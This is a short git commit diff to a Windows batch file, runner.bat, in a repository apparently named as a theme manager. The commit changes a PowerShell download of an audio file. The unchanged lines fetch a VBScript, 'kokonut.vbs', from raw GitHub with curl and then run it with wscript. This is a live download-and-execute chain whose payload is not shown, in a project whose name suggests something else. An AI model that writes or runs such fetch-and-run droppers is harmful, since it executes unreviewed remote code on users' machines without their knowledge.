56a16fadfa83f9d80242a8c5d7ad44fb16c2b3fe
Robosapien737 <91835339+Robosapien737@users.noreply.github.com>
2024-07-14 23:25:31 -0700

    Update runner.bat

--- runner.bat
+++ runner.bat
@@ -1,3 +1,3 @@
-powershell Invoke-WebRequest -Uri https://github.com/Robosapien737/test/raw/main/funni.m4a -OutFile funni.m4a
+powershell Invoke-WebRequest -Uri https://github.com/Robosapien737/BDThemeManager/raw/main/funni.m4a -OutFile funni.m4a
 curl -o kokonut.vbs https://raw.githubusercontent.com/Robosapien737/BDThemeManager/main/kokonut.vbs
 wscript kokonut.vbs
